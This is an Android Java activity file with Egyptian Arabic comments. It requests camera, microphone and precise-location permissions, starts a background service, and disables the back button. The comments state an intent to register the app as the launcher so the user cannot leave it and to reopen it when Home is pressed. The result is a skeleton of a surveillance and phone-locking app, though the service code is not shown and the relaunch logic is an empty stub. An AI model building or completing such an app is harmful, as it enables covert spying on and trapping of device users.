package com.example.app;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnStart = findViewById(R.id.btnStart);
        btnStart.setOnClickListener(v -> {
            // طلب الصلاحيات
            String[] perms = {Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION};
            ActivityCompat.requestPermissions(this, perms, 100);

            // تشغيل خدمة الخلفية
            Intent serviceIntent = new Intent(this, BgService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            // منع المستخدم من الرجوع لشاشة الموبايل الأصلية
            // (هيتم تفعيلها كـ Launcher)
        });
    }

    // منع زرار الرجوع (Back)
    @Override
    public void onBackPressed() {
        // مفيش حاجة بتحصل
    }

    // لو المستخدم داس "هوم"، التطبيق يفتح نفسه تاني
    @Override
    protected void onResume() {
        super.onResume();
        // لو التطبيق اتقفل ورجع، يتأكد إنه شغال
    }
}
